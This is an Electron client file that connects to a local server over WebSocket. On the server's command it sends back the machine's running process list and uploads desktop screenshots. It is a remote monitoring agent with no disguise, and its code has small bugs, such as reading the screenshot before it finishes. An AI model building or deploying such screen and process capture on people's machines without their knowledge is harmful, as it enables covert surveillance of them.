const { app, BrowserWindow } = require('electron');
const axios = require('axios');
const WebSocket = require('ws');
const os = require('os');
const screenshot = require('desktop-screenshot');
const FormData = require('form-data');
const fs = require('fs');
const exec = require('child_process').exec;

const SERVER_URL = '127.0.0.1:8000';

let CURRENT_ID = null;
let PC_NAME = null;
let ACTIVITY = null;
let CURRENT_IP = null;

const createWindow = () => {
  const window = new BrowserWindow({
    width: 800,
    height: 600,
  });
};

function setCurrentID(connect_websocket) {
  axios({
    method: 'get',
    url: `http://${SERVER_URL}/get_id/`,
    data: {
      'pc_name': os.hostname(),
    },
  }).then((response) => {
    CURRENT_ID = response.data.id;
    PC_NAME = response.data.pc_name;
    ACTIVITY = response.data.activity;
    CURRENT_IP = response.data.ip;
    connect_websocket();
  }).catch((err) => {
    setTimeout(() => {setCurrentID(connect_websocket)}, 10000);
  });
};

function connectWebSocket() {
  const ws = new WebSocket(
    'ws://'
    + SERVER_URL
    + '/ws/list/'
  );

  ws.onmessage = function (e) {
    parseResponse(ws, e.data);
  };

  ws.onclose = function (e) {
    throw ('WebSocket closed unexeceptly.');
  };

  ws.addEventListener('open', function () {
    sendConnectRequest(ws);

    app.on('will-quit', () => {
      sendDisconnectRequest(ws);
    });
  });
};

function sendConnectRequest(ws) {
  const request = {
    id: CURRENT_ID,
    command: 'connect',
    pc_name: PC_NAME,
    activity: ACTIVITY,
    ip: CURRENT_IP,
  };

  ws.send(JSON.stringify(request));
};

function sendDisconnectRequest(ws) {
  const request = {
    id: CURRENT_ID,
    command: 'disconnect',
  };

  ws.send(JSON.stringify(request));
};

const commands = {
  'send_tasklist': (data) => sendTasklistRequest(data),
  'send_screenshot': (data) => sendScreenshotRequest(data),
};

function parseResponse(ws, response) {
  const data = JSON.parse(response);
  if (data.id === CURRENT_ID & data.command in commands) {
    commands[data.command](ws, data);
  }
};

function sendTasklistRequest(ws, data) {
  exec('tasklist', (err, stdout, stderr) => {
    const response = {
      id: CURRENT_ID,
      command: 'tasklist_sended',
      tasks: stdout
    };
    ws.send(JSON.stringify(response));
  });
};

function sendScreenshotRequest(ws, data) {
  screenshot("screenshot.png", function(error, complete) {
    if(error)
        console.log("Screenshot failed", error);
    else
        console.log("Screenshot succeeded");
  });

  let fdata = new FormData();
  fdata.append('file', fs.createReadStream('screenshot.png'));

  axios.post(`http://${SERVER_URL}/save_picture/`, fdata, {
    headers: {
      'accept': 'application/json',
      'Accept-Language': 'en-US,en;q=0.8',
      'Content-Type': `multipart/form-data; boundary=${fdata._boundary}`,
    }
  }).then(function (response) {
    console.log(response.data.sc_url);
    const result = {
      id: CURRENT_ID,
      command: 'screenshot_sended',
      screenshot_url: response.data.sc_url,
    };
    ws.send(JSON.stringify(result));
  });
};

app.whenReady().then(() => {
  createWindow();
  setCurrentID(connectWebSocket);
});
